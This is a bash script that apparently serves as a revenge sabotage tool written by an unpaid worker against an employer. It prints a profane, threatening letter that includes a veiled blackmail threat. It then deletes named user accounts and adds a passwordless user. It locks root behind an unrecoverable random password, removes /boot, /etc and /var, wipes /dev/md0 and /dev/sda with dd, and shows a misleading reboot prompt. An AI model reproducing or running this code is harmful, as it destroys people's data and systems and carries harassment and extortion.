#! /bin/bash
##Harbinger, a forbearer to the harvest, usually involving death, and vengence.
## I am Harbinger!

message() {

cat << EOF

Harbinger, a forbearer to the harvest, usually involving death, and vengence.
 rm -r -f * ~/data
 rm -r -f * /srv/data
 # it was not paid for
 he who claims what has not been paid for shall pay,
 for stolen the life of another he has,
 and on the day of the harvest,
 his work, revealed, will go up in flames,
 as daring to work only to ensure the good of himself,
 he killed children, his siblings, his parents, his wife,
 a greedy snout that will suffer for his crimes.
 

   =   =====>  [][]
   =   W        <>
 ====  
 ===== 
 ===== 
 ===== 
 ====   
 Suckit Asshole!
 If you cannot treat me right,
 or pay me to work for you,
 or even pay for the work that I have done for you,
 then you cannot keep what I have made for you,
 you sniveling prick.

 I am the Harbinger!
 Fool me once, shame on you,
 fool me twice, shame on me.

 you told me not too long ago,
 "i can do the job without you..."

 now here is my response to you,
 	"let us see how long you can go
	 without fucking up worse. Knowledge is power,
	 and you do not have the knowledge to make it work.
	 You have treated me like i am stupid, yet
	 you yourself cannot fix the simplest of problems.

	 you talk to your customers like you know something,
	 but you do not know shit. I am told that I play with words,
	 but i do not. Your lack of knowledge should have been 
	 remedied by a dictionary and some online coursework, 
	 but your imediate condition states that a mentally retarded
	 individual could do better with three pennies than what you
	 have done with 20,000 dollars.

	 As such, rock carries more dignity in its ignorance of dirt,
	 than the pile of rotting flesh flapping in the howling wind,
	 that is called your face. No stench can be more nauseating
	 than the breath of presence."
 you tell me
 	"you are bullshitting"
 i tell you
 	"really, how about the fact that you cannot properly track
	finances without me."
 you tell me
 	"fuck you!"
 i tell you
 	"and you too"
 i do not owe anything to you, as you have used me for that which you
 thought would be profitable... Now you will pay for your crimes
 against humanity. if anything, I know that you are a criminal, and I know things about you that could make me some cash, should i need
 it, so tread very lightly. Oh, and I have all the evidence I need.

 Death comes to us all,
 some faster than others,
 but the destination is always the same,
 a giant fucking hole in the ground,
 for from dust you came,
 to dust, you shall return.

EOF

}
message | lpr
sleep 5s
if [ -e /usr/bin/startx  ] && [ -e /usr/bin/xfce4-terminal ] ; then
	xterm -e "echo 'Please reboot by holding down the power button for 20 sec. The press the power button to boot the machine. When prompted, press the F1 key! Oh and please check the printer!'"
else
	echo 'Please reboot by holding down the power button for 20 sec. The press the power button to boot the machine. When prompted, press the F1 key! Oh and please check the printer!'
fi
## delete all user data, as it was not paid for.
## also, as insurance that if self destruct fails, all data that is important is destroyed

userdel -rf carl
userdel -rf techzone


## add a default user, no password
useradd -d /home/default -m default


## change root password to hash `time of execution `+`uname -a`
hashed="$(echo \"`date` `uname -a`\" | sha512sum | cut -f1 -d' ')"
echo -e "$hashed\n$hashed\n" | passwd root

## wipe secondary HDD
dd if=/dev/zero of=/dev/md0
mkfs.ext4 /dev/md0
## delete the boot directory, and configuration directories

rm -rf /boot /etc /var

## finalize the server destruction

dd if=/dev/zero of=/dev/sda
